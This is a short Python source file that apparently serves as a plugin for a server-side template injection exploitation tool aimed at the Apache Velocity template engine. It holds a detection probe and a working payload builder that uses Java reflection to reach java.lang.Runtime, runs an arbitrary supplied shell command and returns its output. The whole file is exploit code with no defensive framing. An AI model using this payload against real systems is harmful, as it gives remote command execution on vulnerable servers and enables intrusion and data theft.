class velocity:
    def __init__(self):
        self.name = "velocity"
        self.exec = True
        self.download = False

    def payload_test(self):
        return ["#set ($run=347*21) $run"]

    def execu(self,cmd,index=-1):
        payload = [
        '''#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("'''+cmd+'''"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
        '''
        ]
        if index >= 0:
            return payload[index]
        return payload

